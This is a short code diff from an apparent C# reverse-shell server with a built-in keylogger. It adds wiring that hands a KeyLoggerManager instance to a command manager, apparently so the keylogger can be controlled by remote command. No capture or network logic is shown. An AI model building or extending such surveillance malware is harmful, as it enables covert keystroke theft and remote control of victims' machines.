@@ -12,6 +12,7 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using Commands;
 using KeyLogger;
 
 namespace ReverseShellServer
@@ -22,7 +23,7 @@ namespace ReverseShellServer
     public partial class MainWindow : Window
     {
         /// <summary>
-        /// The keyLoggerManager must be instanciated and started from this thread
+        /// The keyLoggerManager must be instanciated from this thread
         /// </summary>
         public static KeyLoggerManager keyLoggerManager;
 
@@ -31,7 +32,9 @@ namespace ReverseShellServer
         {
             InitializeComponent();
 
+            // Give the KeyloggerManager instance to the KeyLogger ICommand
             keyLoggerManager = new KeyLoggerManager();
+            CommandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
             
             // Start the server manager in a new thread as a task
             var manager = new ServerManager();
